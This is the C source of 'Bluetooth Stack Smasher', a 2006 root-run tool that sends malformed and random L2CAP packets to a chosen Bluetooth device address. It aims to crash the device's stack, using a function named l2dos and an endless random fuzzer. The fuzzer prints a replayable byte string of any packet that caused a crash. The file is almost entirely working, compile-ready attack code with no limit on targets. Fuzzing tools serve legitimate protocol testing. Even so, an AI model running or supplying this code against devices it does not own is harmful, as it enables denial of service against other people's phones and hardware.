/*
 * BSS: Bluetooth Stack Smasher
 * This tool intends to perform several tests on the L2CAP layer 
 * of the bluetooth protocol.
 *
 * Pierre BETOUIN <pierre.betouin@security-labs.org>
 * 
 * You may need to install the libbluetooth (-dev) first. 
 * Debian : apt-get install libbluetooth1-dev
 *
 * Copyright (C) 2006 Pierre BETOUIN
 * 
 * Written 2006 by Pierre BETOUIN <pierre.betouin@security-labs.org>
 * 
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation;
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT OF THIRD PARTY
 * RIGHTS.  IN NO EVENT SHALL THE COPYRIGHT HOLDER(S) AND AUTHOR(S) BE LIABLE
 * FOR ANY CLAIM, OR ANY SPECIAL INDIRECT OR CONSEQUENTIAL DAMAGES, OR ANY
 * DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN
 * AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
 * OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 * 
 * ALL LIABILITY, INCLUDING LIABILITY FOR INFRINGEMENT OF ANY PATENTS,
 * COPYRIGHTS, TRADEMARKS OR OTHER RIGHTS, RELATING TO USE OF THIS SOFTWARE
 * IS DISCLAIMED.
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>
#include <asm/byteorder.h>

#define MAXSIZE		4096
#define IT		512
#define LENGTH		20
#define	BUFCODE		100

int usage(char *);
void l2dos(char *, int, int, char);
void l2fuzz(char *bdstr_addr, int maxsize, int maxcrash);
char *code2define(int code);

void l2dos(char *bdstr_addr, int cmdnum, int siz, char pad)
{
	char *buf;
	l2cap_cmd_hdr *cmd;		/* struct detailed in /usr/include/bluetooth/l2cap.h */
	struct sockaddr_l2 addr;
	int sock, i, id;
	char *strcode = NULL;
	
	if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
		perror("socket");
		exit(EXIT_FAILURE);
	}

	memset(&addr, 0, sizeof(addr));
	addr.l2_family = AF_BLUETOOTH;
	if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		perror("bind");
		exit(EXIT_FAILURE);
	}

	str2ba(bdstr_addr, &addr.l2_bdaddr);
	if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		perror("connect");
		exit(EXIT_FAILURE);
	}

	if(!(buf = (char *) malloc ((int) siz))) {
		perror("malloc");
		exit(EXIT_FAILURE);
	}

	for(i = L2CAP_CMD_HDR_SIZE; i < siz; i++)
	{
		if( pad == 0 )
			buf[i] = 0x41;		/* Default padding byte */
		else
			buf[i] = pad;
	}
	
	fprintf(stdout, "size = %d\n",siz);
	strcode = code2define(cmdnum);
	if(strcode == NULL)
	{
		perror("L2CAP command unknown");
		exit(EXIT_FAILURE);
	}
	else
		fprintf(stdout, "Performing \"%s\" fuzzing...\n",strcode);

	for(i = 0; i < IT; i++){			// Send IT times the packet thru the air
		cmd = (l2cap_cmd_hdr *) buf;
		cmd->code = cmdnum;
		cmd->ident = (i%250) + 1;		// Identificator 
		cmd->len = __cpu_to_le16(LENGTH);

		putchar('.');
		fflush(stdout);
		
		if(send(sock, buf, siz?siz:MAXSIZE, 0) <= 0)
		{
			fprintf(stdout, "\n%s BT stack may have crashed. This device seems to be vulnerable to buggy %s packets.\n", bdstr_addr, strcode);
			fprintf(stdout, "Please, ensure that the device has really crashed doing a bt scan for instance.\n");
			fprintf(stdout, "\t ----------------------------------------------------\n");
			fprintf(stdout, "\t Host\t\t%s\n", bdstr_addr);
			fprintf(stdout, "\t Code field\t%s\n", strcode);
			fprintf(stdout, "\t Ident field\t%d\n", id);
			fprintf(stdout, "\t Length field\t%d\n", __cpu_to_le16(LENGTH));
			fprintf(stdout, "\t Packet size\t%d\n", siz);
			fprintf(stdout, "\t ----------------------------------------------------\n");
		}
		if(++id > 254)
			id = 1;
	}

	free(strcode);	
}

void l2fuzz(char *bdstr_addr, int maxsize, int maxcrash)
{
	char *buf, *savedbuf;
	struct sockaddr_l2 addr;
	int sock, i, size;
	int crash_count=0, savedsize;
	if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
		perror("socket");
		exit(EXIT_FAILURE);
	}

	memset(&addr, 0, sizeof(addr));
	addr.l2_family = AF_BLUETOOTH;
	if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		perror("bind");
		exit(EXIT_FAILURE);
	}

	str2ba(bdstr_addr, &addr.l2_bdaddr);
	if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		perror("connect");
		exit(EXIT_FAILURE);
	}

	if(!(savedbuf = (char *) malloc ((int) maxsize + 1))) {
		perror("malloc");
		exit(EXIT_FAILURE);
	}

	while(1)		// Initite loop (ctrl-c to stop...)
	{
		size=rand() % maxsize;
		if(size == 0) 
			size=1;
		if(!(buf = (char *) malloc ((int) size + 1))) {
			perror("malloc");
			exit(EXIT_FAILURE);
		}

		bzero(buf, size);
		for(i=0 ; i<size ; i++)	
			buf[i] = (char) rand();
		
		putchar('.');
		fflush(stdout);
		
		if(send(sock, buf, size, 0) <= 0)
		{
			crash_count++;
			fprintf(stdout, "\n%s BT stack may have crashed. This device seems to be vulnerable to buggy packets.\n", bdstr_addr);
			fprintf(stdout, "Please, ensure that the device has really crashed doing a bt scan for instance.\n");
			fprintf(stdout, "\t----------------------------------------------------\n");
			fprintf(stdout, "\tHost\t\t%s\n", bdstr_addr);
			fprintf(stdout, "\tPacket size\t%d\n", savedsize);
			fprintf(stdout, "\t----------------------------------------------------\n");
			fprintf(stdout, "\tPacket dump\n\t");
			for(i=0 ; i<savedsize ; i++)
			{
				fprintf(stdout, "0x%.2X ", (unsigned char) savedbuf[i]);
				if( (i%30) == 29)
					fprintf(stdout, "\n\t");
			}
			fprintf(stdout, "\n\t----------------------------------------------------\n");

			fprintf(stdout, "char replay_buggy_packet[]=\"");
			for(i=0 ; i<savedsize ; i++)
			{
				fprintf(stdout, "\\x%.2X", (unsigned char) savedbuf[i]);
			}
			fprintf(stdout, "\";\n");

			if((crash_count == maxcrash) && (maxcrash != 0) && (maxcrash >= 0))
			{
				free(buf);
				free(savedbuf);
				exit(EXIT_SUCCESS);
			}
			
		}
		memcpy(savedbuf, buf, size);	// Get the previous packet, not this one...
		savedsize = size;
		free(buf);
	}
}

int usage(char *name)
{
	fprintf(stderr, "BSS: Bluetooth Stack Smasher\n");
	fprintf(stderr, "Usage: %s [-s size] [-m mode] [-p pad_byte] [-M maxcrash_count] <bdaddr>\n", name);
	fprintf(stderr, "Modes are :\n	\
			0  ALL MODES LISTED BELOW\n	\
			1  L2CAP_COMMAND_REJ\n	\
			2  L2CAP_CONN_REQ\n	\
			3  L2CAP_CONN_RSP\n	\
			4  L2CAP_CONF_REQ\n	\
			5  L2CAP_CONF_RSP\n	\
			6  L2CAP_DISCONN_REQ\n	\
			7  L2CAP_DISCONN_RSP\n	\
			8  L2CAP_ECHO_REQ\n	\
			9  L2CAP_ECHO_RSP\n	\
			10 L2CAP_INFO_REQ\n	\
			11 L2CAP_INFO_RSP\n	\
			12 L2CAP Random Fuzzing (-s : max_size) (-M crashcount)\n\n");	
	exit(EXIT_FAILURE);
}


char *code2define(int code)
{
	char *strcode= malloc(BUFCODE + 1);
	switch(code)
	{
		case L2CAP_ECHO_REQ:
			strcpy(strcode, "L2CAP echo request");	
			break;

		case L2CAP_COMMAND_REJ:
			strcpy(strcode, "L2CAP command reject");	
			break;
			
		case L2CAP_CONN_REQ:
			strcpy(strcode, "L2CAP connection request");	
			break;
			
		case L2CAP_CONN_RSP:
			strcpy(strcode, "L2CAP connexion response");	
			break;
			
		case L2CAP_CONF_REQ:
			strcpy(strcode, "L2CAP configuration request");	
			break;
			
		case L2CAP_CONF_RSP:
			strcpy(strcode, "L2CAP configuration response");	
			break;
			
		case L2CAP_DISCONN_REQ:
			strcpy(strcode, "L2CAP disconnection request");	
			break;
			
		case L2CAP_DISCONN_RSP:
			strcpy(strcode, "L2CAP disconnection response");	
			break;
			
		case L2CAP_ECHO_RSP:
			strcpy(strcode, "L2CAP echo response");	
			break;
			
		case L2CAP_INFO_REQ:
			strcpy(strcode, "L2CAP info request");	
			break;
			
		case L2CAP_INFO_RSP:
			strcpy(strcode, "L2CAP info response");	
			break;
			
		default:
			strcode=NULL;
	}
	return strcode;
}

int main(int argc, char **argv)
{
	int i, siz = 0, mode = 0, maxcrash=1;
	char bdaddr[20], pad=0;

	if(getuid() != 0)
	{
		fprintf(stderr, "You need to be root to launch %s (raw socket)\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	
	if(argc < 2 || argc > 9)
	{
		usage(argv[0]);
	}
	
	for(i = 0; i < argc; i++){
		if(strchr(argv[i], ':'))
			strncpy(bdaddr, argv[i], 18);
		else
		{
		if(!memcmp(argv[i], "-s", 2) && (siz = atoi(argv[++i])) < 0)
			usage(argv[0]);
		
		if(!memcmp(argv[i], "-m", 2) && (mode = atoi(argv[++i])) < 0)
			usage(argv[0]);
		
		if(!memcmp(argv[i], "-p", 2) && (pad = (*argv[++i])) < 0)
			usage(argv[0]);
		
		if(!memcmp(argv[i], "-M", 2) && (maxcrash = atoi(argv[++i])) < 0)
			usage(argv[0]);

		}
	}

	if(mode > 12)
	{
		usage(argv[0]);
		exit(EXIT_FAILURE);
	}

	if(mode == 0)
	{
		for(i=1; i <= 0x0b; i++)
			l2dos(bdaddr, i, siz?siz:MAXSIZE, pad);
		l2fuzz(bdaddr, siz?siz:MAXSIZE, maxcrash);
	}
	else
	{
		if(mode <= 11)
			l2dos(bdaddr, mode, siz?siz:MAXSIZE, pad);
		if(mode == 12)
			l2fuzz(bdaddr, siz?siz:MAXSIZE, maxcrash);
	}
	fprintf(stdout, "\nYour bluetooth device didn't crash receiving the packets\n");
	
	return EXIT_SUCCESS;
}
